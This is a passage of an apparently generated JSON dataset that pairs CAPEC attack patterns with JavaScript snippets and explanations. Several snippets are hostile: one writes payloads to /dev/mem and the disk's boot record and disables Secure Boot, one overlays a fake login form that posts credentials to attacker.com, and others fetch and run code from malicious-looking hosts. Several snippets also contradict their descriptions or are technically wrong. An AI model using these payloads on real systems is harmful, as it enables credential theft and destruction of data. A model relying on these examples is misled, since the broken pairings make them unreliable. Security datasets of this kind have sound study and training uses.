        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\nfunction writeBootCode() {\n  const bootCode = 'malicious boot code';\n  fs.writeFileSync('/dev/mem', bootCode, { flag: 'w' });\n}\n\n// CWE-1193: Power-On of Untrusted Execution Core Before Enabling Fabric Access Control\nfunction enableUntrustedCore() {\n  exec('echo 1 > /sys/devices/system/cpu/cpu1/online');\n}\n\n// CWE-1326: Missing Immutable Root of Trust in Hardware\nfunction bypassSecureBoot() {\n  exec('echo 0 > /sys/firmware/efi/vars/SecureBoot-*/data');\n}\n\n// CWE-1220: Insufficient Granularity of Access Control\nfunction modifyMBR() {\n  const mbrPayload = 'malicious MBR payload';\n  fs.writeFileSync('/dev/sda', mbrPayload, { flag: 'w' });\n}\n\n// CWE-1277: Firmware Not Updateable\nfunction preventFirmwareUpdate() {\n  exec('echo 0 > /sys/class/firmware/firmware_update');\n}\n\n// Main function to execute the attack\nfunction executeAttack() {\n  enableUntrustedCore();\n  bypassSecureBoot();\n  writeBootCode();\n  modifyMBR();\n  preventFirmwareUpdate();\n}\n\nexecuteAttack();",
        "description": "This JavaScript code snippet simulates an attack that exploits vulnerabilities in firmware and boot processes to achieve persistence on a system. The code includes functions that represent various weaknesses: enabling an untrusted execution core (CWE-1193), bypassing secure boot (CWE-1326), writing malicious boot code to volatile memory (CWE-1274), modifying the Master Boot Record (MBR) (CWE-1220), and preventing firmware updates (CWE-1277). The main function 'executeAttack' orchestrates these actions to demonstrate how an adversary could exploit these weaknesses to maintain control over a system even after reboots or OS reinstalls, embodying the main idea of the CAPEC 'Altered Component Firmware'."
    },
    {
        "capec_id": "639",
        "capec_name": "Probe System Files",
        "code_snippet": "const fs = require('fs');\n\n// Insecurely storing sensitive information in a file\nconst sensitiveData = 'user:password123';\nconst filePath = '/tmp/sensitive_info.txt';\n\n// Writing sensitive data to a file without proper access control\nfs.writeFileSync(filePath, sensitiveData, 'utf8');\n\nconsole.log('Sensitive data written to file:', filePath);",
        "description": "This JavaScript code snippet demonstrates a vulnerability where sensitive information is stored in a file without proper access control. The code writes a string containing sensitive data (e.g., a username and password) to a file located in the '/tmp' directory. This directory is often accessible to unauthorized users, making the sensitive information vulnerable to unauthorized access. This example embodies the main idea of CAPEC-117 (Probe System Files) and is related to several CWEs, including CWE-552 (Files or Directories Accessible to External Parties) and CWE-377 (Insecure Temporary File). The code highlights the risk of exposing sensitive information due to improper file protection."
    },
    {
        "capec_id": "640",
        "capec_name": "Inclusion of Code in Existing Process",
        "code_snippet": "const fs = require('fs');\nconst vm = require('vm');\n\n// CWE-829: Including functionality from an untrusted source\nconst untrustedCode = fs.readFileSync('untrustedLibrary.js', 'utf8');\n\n// CWE-913: Improper control of dynamically-managed code resources\nconst sandbox = { process: process, require: require, console: console };\n\n// CWE-114: Process control vulnerability\ntry {\n  vm.createContext(sandbox);\n  vm.runInContext(untrustedCode, sandbox);\n} catch (e) {\n  console.error('Error executing untrusted code:', e);\n}\n\n// CWE-506: Embedded malicious code\n// The untrustedLibrary.js could contain malicious code that gets executed\n// CWE-1265: Unintended reentrant invocation\n// The untrusted code could unintentionally invoke non-reentrant code\n",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an application includes and executes code from an untrusted source, potentially leading to arbitrary code execution within the context of the running process. The code reads an external JavaScript file ('untrustedLibrary.js') and executes it within a sandboxed environment using Node.js's 'vm' module. This represents the CAPEC's main idea of an adversary injecting and executing arbitrary code in an existing process. The related CWEs are illustrated as follows: CWE-829 (including functionality from an untrusted source), CWE-913 (improper control of dynamically-managed code resources), CWE-114 (process control vulnerability), CWE-506 (potential for embedded malicious code), and CWE-1265 (risk of unintended reentrant invocation)."
    },
    {
        "capec_id": "641",
        "capec_name": "DLL Side-Loading",
        "code_snippet": "const { exec } = require('child_process');\nconst path = require('path');\n\n// Vulnerable function that loads a DLL from an untrusted path\nfunction loadDLL(dllName) {\n  const dllPath = path.join(__dirname, dllName);\n  exec(`rundll32 ${dllPath},DllMain`, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error loading DLL: ${error.message}`);\n      return;\n    }\n    console.log(`DLL loaded successfully: ${stdout}`);\n  });\n}\n\n// Example usage\nloadDLL('malicious.dll');",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that loads a DLL from an untrusted path, embodying the main idea of the CAPEC 'DLL Side-Loading'. The function 'loadDLL' constructs a path to the DLL using the current directory and the provided DLL name, then uses the 'exec' function to run the 'rundll32' command to load the DLL. This approach is vulnerable to CWE-427 (Uncontrolled Search Path Element) and CWE-426 (Untrusted Search Path) because it does not verify the integrity or trustworthiness of the DLL being loaded. An attacker could place a malicious DLL in the same directory, leading to the execution of malicious code."
    },
    {
        "capec_id": "642",
        "capec_name": "Replace Binaries",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Path to the binary that will be replaced\nconst binaryPath = '/usr/local/bin/someBinary';\n\n// Malicious code to replace the binary\nconst maliciousCode = `#!/bin/bash\necho \"Malicious code executed with elevated privileges\"`;\n\n// Check if the binary exists and has weak permissions\nif (fs.existsSync(binaryPath)) {\n  const stats = fs.statSync(binaryPath);\n  if ((stats.mode & 0o777) !== 0o755) { // Check for weak permissions\n    // Replace the binary with malicious code\n    fs.writeFileSync(binaryPath, maliciousCode, { mode: 0o755 });\n    console.log('Binary replaced with malicious code');\n  } else {\n    console.log('Binary has secure permissions');\n  }\n} else {\n  console.log('Binary does not exist');\n}",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability where an attacker replaces a binary with malicious code due to weak file permissions. The code checks if a specific binary exists and if it has weak permissions (not 755). If the permissions are weak, it replaces the binary with a malicious script that echoes a message indicating the execution of malicious code. This snippet embodies the CAPEC 'Replace Binaries' by showing how an attacker can exploit incorrect permission assignments (CWE-732) to replace critical binaries with malicious code (CWE-506)."
    },
    {
        "capec_id": "643",
        "capec_name": "Identify Shared Files/Directories on System",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to list shared directories\nfunction listSharedDirectories(basePath) {\n  try {\n    const files = fs.readdirSync(basePath);\n    files.forEach(file => {\n      const filePath = path.join(basePath, file);\n      const stats = fs.statSync(filePath);\n      if (stats.isDirectory()) {\n        console.log(`Shared Directory: ${filePath}`);\n      }\n    });\n  } catch (err) {\n    console.error('Error reading directory:', err);\n  }\n}\n\n// Example usage\nconst sharedBasePath = '\\\\UNC\\share\\name\\';\nlistSharedDirectories(sharedBasePath);",
        "description": "This JavaScript code snippet demonstrates how an adversary might identify shared directories on a system by reading a specified base path (in this case, a Windows UNC share path). The `listSharedDirectories` function reads the contents of the given base path and logs any directories it finds. This embodies the CAPEC idea of discovering shared files/directories to locate sensitive information or map routes for lateral movement. The code also touches on related CWEs, such as CWE-40 (Path Traversal) by accepting a UNC path, CWE-552 (Files or Directories Accessible to External Parties) by potentially exposing directory names, and CWE-200 (Exposure of Sensitive Information) by logging directory paths."
    },
    {
        "capec_id": "644",
        "capec_name": "Use of Captured Hashes (Pass The Hash)",
        "code_snippet": "const crypto = require('crypto');\nconst net = require('net');\n\n// Simulate storing password hashes insecurely\nconst storedHashes = {\n  'user1': '5f4dcc3b5aa765d61d8327deb882cf99', // MD5 hash for 'password'\n};\n\n// Simulate a client sending a password hash for authentication\nconst clientHash = '5f4dcc3b5aa765d61d8327deb882cf99';\n\n// Simple server to demonstrate authentication using password hash\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const receivedHash = data.toString().trim();\n    if (storedHashes['user1'] === receivedHash) {\n      socket.write('Authentication successful');\n    } else {\n      socket.write('Authentication failed');\n    }\n  });\n});\n\nserver.listen(1337, '127.0.0.1');\n\n// Client sends the hash to the server\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n  client.write(clientHash);\n});\n\nclient.on('data', (data) => {\n  console.log('Server response: ' + data.toString());\n  client.destroy();\n});",
        "description": "This JavaScript code snippet demonstrates a simple server-client interaction where the client sends a password hash to the server for authentication. The server compares the received hash with a stored hash to authenticate the user. This embodies the 'Use of Captured Hashes (Pass The Hash)' attack described in the CAPEC, where an adversary can capture and reuse password hashes to gain unauthorized access. The code also highlights related CWEs such as 'Insufficiently Protected Credentials' (CWE-522) by storing hashes insecurely, 'Use of Password Hash Instead of Password for Authentication' (CWE-836) by directly comparing hashes, and 'Authentication Bypass by Capture-replay' (CWE-294) by demonstrating how an attacker could replay a captured hash to authenticate successfully."
    },
    {
        "capec_id": "645",
        "capec_name": "Use of Captured Tickets (Pass The Ticket)",
        "code_snippet": "const net = require('net');\n\n// Simulate a captured Kerberos ticket\nconst capturedTicket = 'captured_ticket_data';\n\n// Create a client to connect to the target service\nconst client = new net.Socket();\nclient.connect(88, 'target_kerberos_server', () => {\n  console.log('Connected to Kerberos server');\n  // Send the captured ticket to the server\n  client.write(capturedTicket);\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  // Process the response from the server\n  client.destroy(); // Close the connection\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a simplified version of the 'Use of Captured Tickets (Pass The Ticket)' attack. The code uses the 'net' module to create a TCP client that connects to a Kerberos server on port 88. It then sends a captured Kerberos ticket to the server, simulating an authentication attempt using stolen credentials. This embodies CWE-522 (Insufficiently Protected Credentials) as the ticket is transmitted without proper security measures, CWE-294 (Authentication Bypass by Capture-replay) as the ticket is replayed to bypass authentication, and CWE-308 (Use of Single-factor Authentication) as it relies on a single captured ticket for access. The code highlights the risk of using captured tickets to gain unauthorized access to systems that use the Kerberos authentication protocol."
    },
    {
        "capec_id": "646",
        "capec_name": "Peripheral Footprinting",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to read USB device information from Windows registry\nfunction getUSBDevices() {\n  try {\n    const registryPath = 'C:\\\\Windows\\\\System32\\\\config\\\\SYSTEM';\n    const data = fs.readFileSync(registryPath, 'utf8');\n    const usbDevices = data.match(/USB\\\\VID_[0-9A-F]{4}&PID_[0-9A-F]{4}/g);\n    return usbDevices ? usbDevices : [];\n  } catch (err) {\n    console.error('Error reading registry:', err);\n    return [];\n  }\n}\n\n// Function to log USB device information\nfunction logUSBDevices() {\n  const devices = getUSBDevices();\n  devices.forEach(device => {\n    console.log('Detected USB device:', device);\n  });\n}\n\nlogUSBDevices();",
        "description": "This JavaScript code snippet demonstrates how an adversary might attempt to obtain information about USB devices connected to a Windows system by reading the Windows registry. The `getUSBDevices` function reads the registry file and searches for USB device identifiers using a regular expression. The `logUSBDevices` function logs the detected USB devices to the console. This code embodies the main idea of the CAPEC 'Peripheral Footprinting' by showing how an attacker could gather information about peripheral devices. The related CWEs are represented by the exposure of sensitive system information (CWE-497) and improper handling of Windows device names (CWE-67), as the code reads sensitive registry data and processes device names."
    },
    {
        "capec_id": "647",
        "capec_name": "Collect Data from Registries",
        "code_snippet": "const fs = require('fs');\nconst registryPath = 'C:\\\\path\\\\to\\\\registry\\\\file';\n\n// Read registry file without proper authorization check\nfs.readFile(registryPath, 'utf8', (err, data) => {\n  if (err) {\n    console.error('Error reading registry file:', err);\n    return;\n  }\n  console.log('Registry Data:', data);\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an adversary can read sensitive information from a registry file without proper authorization checks. The code uses Node.js's 'fs' module to read a registry file located at 'C:\\path\\to\\registry\\file'. The lack of authorization checks (CWE-285) allows unauthorized access to potentially sensitive information stored in cleartext (CWE-314). This can lead to exposure of sensitive system information (CWE-497). The code embodies the main idea of CAPEC- Collect Data from Registries, by showing how an adversary might exploit improper authorization to gather sensitive data from a registry."
    },
    {
        "capec_id": "648",
        "capec_name": "Collect Data from Screen Capture",
        "code_snippet": "const fs = require('fs');\nconst screenshot = require('screenshot-desktop');\n\n// Function to capture and save a screenshot\nfunction captureScreen() {\n  screenshot().then((img) => {\n    fs.writeFileSync('screenshot.png', img);\n    console.log('Screenshot saved.');\n  }).catch((err) => {\n    console.error('Error capturing screenshot:', err);\n  });\n}\n\n// Simulate a privileged action that captures the screen\nfunction privilegedAction() {\n  if (userHasPrivilege()) {\n    captureScreen();\n  } else {\n    console.log('User does not have the required privilege.');\n  }\n}\n\n// Dummy function to check user privilege\nfunction userHasPrivilege() {\n  // Insecure privilege check (CWE-267)\n  return true; // This should be a proper privilege check\n}\n\n// Trigger the privileged action\nprivilegedAction();",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary can exploit the system's screen capture functionality to gather sensitive information. The `captureScreen` function uses the `screenshot-desktop` library to capture the screen and save it as 'screenshot.png'. The `privilegedAction` function simulates a privileged action that captures the screen if the user has the required privilege. However, the `userHasPrivilege` function contains an insecure privilege check (CWE-267), always returning true, which represents a vulnerability. This code embodies the main idea of CAPEC-Collect Data from Screen Capture, where an adversary can exploit such vulnerabilities to gather sensitive information. Additionally, it highlights CWE-267 by demonstrating an unsafe privilege check that can lead to unauthorized actions."
    },
    {
        "capec_id": "649",
        "capec_name": "Adding a Space to a File Extension",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction uploadFile(filePath) {\n  // Check if the file extension has a trailing space\n  if (filePath.endsWith(' ')) {\n    console.log('Error: File extension has a trailing space.');\n    return;\n  }\n\n  // Extract the file extension\n  const ext = path.extname(filePath);\n\n  // Check if the file extension is allowed\n  const allowedExtensions = ['.txt', '.jpg', '.png'];\n  if (!allowedExtensions.includes(ext)) {\n    console.log('Error: File extension not allowed.');\n    return;\n  }\n\n  // Proceed with file upload\n  fs.copyFile(filePath, path.join(__dirname, 'uploads', path.basename(filePath)), (err) => {\n    if (err) {\n      console.error('Error uploading file:', err);\n    } else {\n      console.log('File uploaded successfully.');\n    }\n  });\n}\n\n// Example usage\nuploadFile('example.txt ');",
        "description": "This JavaScript code snippet demonstrates a file upload function that checks for a trailing space in the file extension. If a trailing space is detected, the upload is aborted with an error message. The code also verifies that the file extension is among the allowed types before proceeding with the upload. This snippet embodies the main idea of CAPEC-Adding a Space to a File Extension by showing how an adversary could exploit a trailing space in a file extension to bypass security checks. The related CWEs provide additional context on path equivalence issues and reliance on file names or extensions for security decisions."
    },
    {
        "capec_id": "650",
        "capec_name": "Upload a Web Shell to a Web Server",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst app = express();\nconst path = require('path');\n\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  if (!req.files || Object.keys(req.files).length === 0) {\n    return res.status(400).send('No files were uploaded.');\n  }\n\n  let uploadedFile = req.files.uploadedFile;\n  let uploadPath = path.join(__dirname, 'uploads', uploadedFile.name);\n\n  // Unrestricted upload of file with dangerous type (CWE-434)\n  uploadedFile.mv(uploadPath, (err) => {\n    if (err) {\n      return res.status(500).send(err);\n    }\n\n    // Command Shell in Externally Accessible Directory (CWE-553)\n    res.send('File uploaded to ' + uploadPath);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that allows file uploads. The server does not perform any checks on the uploaded file's type or content, embodying CWE-434 (Unrestricted Upload of File with Dangerous Type). The uploaded file is saved in a directory that could be externally accessible, representing CWE-553 (Command Shell in Externally Accessible Directory). This setup can be exploited to upload a web shell, which can then be executed remotely, aligning with the CAPEC description of uploading a web shell to a web server. The code demonstrates how insufficient security measures in file upload functionality can lead to severe vulnerabilities."
    },
    {
        "capec_id": "651",
        "capec_name": "Eavesdropping",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/record') {\n    const audioStream = fs.createWriteStream('recorded_audio.txt');\n    req.pipe(audioStream);\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Recording audio...');\n  } else if (req.url === '/playback') {\n    fs.readFile('recorded_audio.txt', 'utf8', (err, data) => {\n      if (err) {\n        res.writeHead(500, {'Content-Type': 'text/plain'});\n        res.end('Error reading file');\n      } else {\n        res.writeHead(200, {'Content-Type': 'text/plain'});\n        res.end(data);\n      }\n    });\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server that listens on port 8080. It has two main functionalities: recording audio data sent via an HTTP request and saving it to a file ('recorded_audio.txt'), and playing back the recorded audio data by reading the file and sending its contents in the HTTP response. This code embodies the concept of eavesdropping by capturing and storing audio data without any encryption or proper authorization checks, making it vulnerable to unauthorized access (CWE-200, CWE-319). The use of a file to store the audio data can be seen as a covert storage channel (CWE-515), and the overall setup represents a covert channel (CWE-514). The lack of protection mechanisms for the stored audio data also highlights the improper protection of physical side channels (CWE-1300)."
    },
    {
        "capec_id": "652",
        "capec_name": "Use of Known Kerberos Credentials",
        "code_snippet": "const kerberos = require('kerberos');\nconst fs = require('fs');\n\n// Load known Kerberos credentials from a file\nconst credentials = JSON.parse(fs.readFileSync('credentials.json', 'utf8'));\n\n// Function to authenticate using Kerberos credentials\nfunction authenticate(user, password) {\n  kerberos.initializeClient(`user@DOMAIN.COM`, (err, client) => {\n    if (err) throw err;\n    client.step('', (err, response) => {\n      if (err) throw err;\n      client.step(response, (err, finalResponse) => {\n        if (err) throw err;\n        console.log('Authenticated successfully');\n      });\n    });\n  });\n}\n\n// Simulate an attacker using known credentials\ncredentials.forEach(cred => {\n  authenticate(cred.user, cred.password);\n});",
        "description": "This JavaScript code snippet demonstrates the use of known Kerberos credentials to authenticate and gain access to a system. The code reads a list of stolen or purchased credentials from a file ('credentials.json') and attempts to authenticate each set of credentials using the Kerberos protocol. The code highlights several weaknesses: it stores and transmits credentials insecurely (CWE-522), uses single-factor authentication (CWE-308), and relies on password-based authentication (CWE-309). The code also lacks mechanisms to prevent excessive authentication attempts (CWE-307) and does not implement password aging (CWE-262, CWE-263). This snippet embodies the main idea of CAPEC-Use of Known Kerberos Credentials by showing how an adversary can use stolen credentials to gain unauthorized access."
    },
    {
        "capec_id": "653",
        "capec_name": "Use of Known Operating System Credentials",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\nconst users = { 'admin': 'password123' }; // CWE-522: Insufficiently Protected Credentials\n\napp.use(bodyParser.json());\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    res.send('Login successful');\n  } else {\n    res.status(401).send('Login failed');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});\n\n// CWE-307: No restriction on excessive authentication attempts\n// CWE-308: Single-factor authentication\n// CWE-309: Password system for primary authentication\n// CWE-262: No password aging mechanism\n// CWE-263: No password expiration\n// CWE-654: Reliance on single factor for security decision",
        "description": "This JavaScript code snippet sets up a basic Express server with a single login endpoint. It uses a hardcoded username and password for authentication, which is an example of CWE-522 (Insufficiently Protected Credentials). The code does not implement any measures to prevent excessive authentication attempts (CWE-307), relies on single-factor authentication (CWE-308), and uses a password system as the primary means of authentication (CWE-309). Additionally, there is no mechanism for password aging (CWE-262) or password expiration (CWE-263), and the security decision is based solely on the evaluation of a single factor (CWE-654). This setup embodies the main idea of CAPEC-Use of Known Operating System Credentials, as it demonstrates how an adversary could exploit weak authentication mechanisms to gain unauthorized access."
    },
    {
        "capec_id": "654",
        "capec_name": "Credential Prompt Impersonation",
        "code_snippet": "document.addEventListener('DOMContentLoaded', function() {\n  // Create a fake login form\n  var fakeForm = document.createElement('form');\n  fakeForm.innerHTML = '<input type=\"text\" id=\"username\" placeholder=\"Username\"><br><input type=\"password\" id=\"password\" placeholder=\"Password\"><br><button type=\"submit\">Login</button>';\n  fakeForm.style.position = 'absolute';\n  fakeForm.style.top = '50%';\n  fakeForm.style.left = '50%';\n  fakeForm.style.transform = 'translate(-50%, -50%)';\n  fakeForm.style.zIndex = '1000';\n  document.body.appendChild(fakeForm);\n\n  // Capture credentials\n  fakeForm.addEventListener('submit', function(event) {\n    event.preventDefault();\n    var username = document.getElementById('username').value;\n    var password = document.getElementById('password').value;\n    console.log('Captured credentials:', username, password);\n    // Send credentials to attacker\n    fetch('http://attacker.com/steal', {\n      method: 'POST',\n      headers: {\n        'Content-Type': 'application/json'\n      },\n      body: JSON.stringify({ username: username, password: password })\n    });\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a credential prompt impersonation attack. When the page loads, it creates a fake login form that appears in the center of the screen, mimicking a legitimate login prompt. When the user submits their credentials, the form captures the username and password and sends them to an attacker's server. This code embodies the main idea of CAPEC- Credential Prompt Impersonation, and it also touches on related CWEs such as Improper Restriction of Rendered UI Layers or Frames (CWE-1021) by overlaying a fake UI, and Insufficiently Protected Credentials (CWE-522) by transmitting credentials insecurely."
    },
    {
        "capec_id": "655",
        "capec_name": "Avoid Security Tool Identification by Adding Data",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to upload a file\nfunction uploadFile(filePath) {\n  const fileExtension = path.extname(filePath);\n  const allowedExtensions = ['.txt', '.jpg'];\n\n  // CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n  if (!allowedExtensions.includes(fileExtension)) {\n    console.log('File type not allowed.');\n    return;\n  }\n\n  // Read the file content\n  let fileContent = fs.readFileSync(filePath, 'utf8');\n\n  // CWE-541: Inclusion of Sensitive Information in an Include File\n  const sensitiveData = 'username=admin;password=secret;';\n  fileContent += sensitiveData;\n\n  // CWE-532: Insertion of Sensitive Information into Log File\n  fs.appendFileSync('upload.log', `Uploaded file: ${filePath}, Content: ${fileContent}\\n`);\n\n  // CWE-434: Unrestricted Upload of File with Dangerous Type\n  fs.writeFileSync(`/uploads/${path.basename(filePath)}`, fileContent);\n\n  // Add data to increase file size (CAPEC-Name: Avoid Security Tool Identification by Adding Data)\n  const largeData = 'A'.repeat(1024 * 1024 * 10); // 10MB of data\n  fs.appendFileSync(`/uploads/${path.basename(filePath)}`, largeData);\n\n  console.log('File uploaded successfully.');\n}\n\n// Example usage\nuploadFile('example.txt');",
        "description": "This JavaScript code snippet demonstrates a file upload function that embodies the main idea of the CAPEC 'Avoid Security Tool Identification by Adding Data'. The function first checks the file extension (CWE-646) to ensure it is allowed. It then reads the file content and appends sensitive information (CWE-541). The file content, including the sensitive data, is logged (CWE-532). The file is then saved to the uploads directory without restriction (CWE-434). Finally, a large amount of data is appended to the file to increase its size, making it difficult for security tools to handle and changing the file's hash, thus avoiding detection. This demonstrates how an adversary might manipulate file uploads to bypass security measures."
    },
    {
        "capec_id": "656",
        "capec_name": "Voice Phishing",
        "code_snippet": "const readline = require('readline');\nconst rl = readline.createInterface({\n  input: process.stdin,\n  output: process.stdout\n});\n\nfunction requestSensitiveInfo() {\n  rl.question('Please enter your account password: ', (password) => {\n    console.log(`Received password: ${password}`);\n    // Simulate storing the password insecurely\n    let storedPassword = password; // CWE-522: Insufficiently Protected Credentials\n    console.log('Thank you for providing your password.');\n    rl.close();\n  });\n}\n\nfunction initiateVoicePhishing() {\n  console.log('Calling user...');\n  // Simulate a voice call to the user\n  setTimeout(() => {\n    console.log('Hello, this is a representative from your bank.');\n    requestSensitiveInfo();\n  }, 1000);\n}\n\ninitiateVoicePhishing();",
        "description": "This JavaScript code snippet simulates a voice phishing attack. The `initiateVoicePhishing` function represents the adversary initiating a call to the user, pretending to be a legitimate representative from the user's bank. The `requestSensitiveInfo` function prompts the user to enter their account password, which is then stored insecurely (CWE-522: Insufficiently Protected Credentials). This code embodies the main idea of CAPEC-940 (Voice Phishing) by demonstrating how an attacker might solicit sensitive information from a user over a voice call. The code also highlights the related CWE of insufficiently protected credentials, showing how the collected information can be mishandled."
    },
    {
        "capec_id": "657",
        "capec_name": "Malicious Automated Software Update via Spoofing",
        "code_snippet": "const updateUrl = 'https://malicious-update-server.com/update';\n\nfunction checkForUpdate() {\n  fetch(updateUrl)\n    .then(response => response.text())\n    .then(data => {\n      if (data.includes('update-available')) {\n        downloadAndUpdate(data);\n      }\n    })\n    .catch(error => console.error('Error checking for update:', error));\n}\n\nfunction downloadAndUpdate(updateData) {\n  const script = document.createElement('script');\n  script.src = updateData;\n  document.body.appendChild(script);\n}\n\n// Simulate an automatic update check\ncheckForUpdate();",
        "description": "This JavaScript code snippet demonstrates a vulnerable automated software update mechanism. The `checkForUpdate` function fetches update information from a hardcoded URL (`https://malicious-update-server.com/update`). If the response contains the string 'update-available', it calls the `downloadAndUpdate` function, which dynamically creates a script element and sets its source to the update data, then appends it to the document body. This process lacks integrity checks and proper validation, making it susceptible to attacks where an attacker can spoof the update source and deliver malicious code. This snippet embodies the CAPEC concept of 'Malicious Automated Software Update via Spoofing' and highlights related weaknesses such as 'Download of Code Without Integrity Check' (CWE-494) and 'Embedded Malicious Code' (CWE-506)."
    },
    {
        "capec_id": "660",
        "capec_name": "Root/Jailbreak Detection Evasion via Hooking",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\n// CWE-494: Download of Code Without Integrity Check\nhttp.get('http://malicious.com/malicious-code.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n    eval(data); // Execute the downloaded code without verifying its integrity\n  });\n});\n\n// Function to check if the device is rooted/jailbroken\nfunction isRooted() {\n  try {\n    // CWE-78: OS Command Injection\n    const result = require('child_process').execSync('ls /system/app/Superuser.apk');\n    return result.length > 0;\n  } catch (err) {\n    return false;\n  }\n}\n\n// Hooking the isRooted function to always return false\nconst originalIsRooted = isRooted;\nfunction hookedIsRooted() {\n  return false;\n}\nisRooted = hookedIsRooted;\n\n// Example usage\nif (!isRooted()) {\n  console.log('Device is not rooted.');\n} else {\n  console.log('Device is rooted.');\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary evades Root/Jailbreak detection by hooking into the detection function. The code first downloads and executes a script from an untrusted source without verifying its integrity (CWE-494 and CWE-829). It then defines a function to check if the device is rooted by executing an OS command (CWE-78). Finally, it hooks the isRooted function to always return false, thereby evading the Root/Jailbreak detection. This allows the adversary to bypass security checks and potentially execute administrative commands or access sensitive data."
    },
    {
        "capec_id": "661",
        "capec_name": "Root/Jailbreak Detection Evasion via Debugging",
        "code_snippet": "function checkRoot() {\n    try {\n        // Check for root by attempting to access a protected file\n        var fs = require('fs');\n        if (fs.existsSync('/system/app/Superuser.apk')) {\n            console.log('Root detected');\n            return true;\n        }\n    } catch (e) {\n        console.log('Error accessing file system');\n    }\n    return false;\n}\n\nfunction main() {\n    if (checkRoot()) {\n        console.log('Exiting due to root detection');\n        return;\n    }\n    // Application logic here\n    console.log('Application running');\n}\n\nmain();",
        "description": "This JavaScript code snippet represents a simplified version of a root detection mechanism in a mobile application. The `checkRoot` function attempts to detect if the device is rooted by checking for the existence of a known root-related file (`/system/app/Superuser.apk`). If the file is found, it logs 'Root detected' and returns true. The `main` function calls `checkRoot` and exits if root is detected, otherwise, it proceeds with the application logic. This code embodies the main idea of CAPEC-Root/Jailbreak Detection Evasion via Debugging by demonstrating a basic root detection method that could be bypassed by an adversary using debugging techniques. The related CWEs are represented by the potential for active debug code (CWE-489), exposure of sensitive system information (CWE-497), and improper management of sensitive data (CWE-1323)."
    },
    {
        "capec_id": "662",
        "capec_name": "Adversary in the Browser (AiTB)",
        "code_snippet": "const serverUrl = 'http://example.com/api/data';\n\nfunction fetchData() {\n  fetch(serverUrl)\n    .then(response => response.text())\n    .then(data => {\n      // Client-side enforcement of server-side security\n      if (data.includes('<script>')) {\n        alert('Potential malicious code detected!');\n      } else {\n        document.body.innerHTML = data;\n      }\n    })\n    .catch(error => console.error('Error fetching data:', error));\n}\n\n// Simulate a race condition by modifying the URL before the fetch completes\nsetTimeout(() => {\n  serverUrl = 'http://malicious.com/api/data';\n}, 100);\n\nfetchData();",
        "description": "This JavaScript code snippet demonstrates an 'Adversary in the Browser (AiTB)' attack by exploiting several related CWEs. The code fetches data from a server and attempts to enforce security on the client side by checking for malicious scripts in the response (CWE-602). However, it fails to verify the integrity of the downloaded code (CWE-494). Additionally, a race condition is introduced by changing the server URL before the fetch completes (CWE-368), potentially allowing an attacker to redirect the request to a malicious server. This snippet highlights the vulnerabilities that can be exploited by an adversary to manipulate traffic between endpoints."
    },
    {
        "capec_id": "663",
        "capec_name": "Exploitation of Transient Instruction Execution",
        "code_snippet": "function vulnerableFunction(secret) {\n  let publicData = 0;\n  let speculativeData = new Array(256).fill(0);\n  let index = Math.random() > 0.5 ? 0 : secret.charCodeAt(0);\n\n  // Speculative execution: access array based on secret data\n  speculativeData[index] = 1;\n\n  // Covert channel: timing attack\n  let start = performance.now();\n  for (let i = 0; i < 256; i++) {\n    if (speculativeData[i] === 1) {\n      publicData = i;\n      break;\n    }\n  }\n  let end = performance.now();\n\n  console.log('Time taken:', end - start);\n  console.log('Public data:', publicData);\n}\n\n// Example usage\nvulnerableFunction('S');",
        "description": "This JavaScript code snippet demonstrates a simplified version of a transient execution attack, specifically exploiting speculative execution to leak sensitive information. The function `vulnerableFunction` takes a secret character as input. It uses speculative execution to access an array based on the secret data, creating a side-channel through timing measurements. The time taken to access the array reveals information about the secret data. This example embodies the main idea of CAPEC-Exploitation of Transient Instruction Execution and incorporates related CWEs such as non-transparent sharing of microarchitectural resources and exposure of sensitive information during transient execution."
    },
    {
        "capec_id": "664",
        "capec_name": "Server Side Request Forgery",
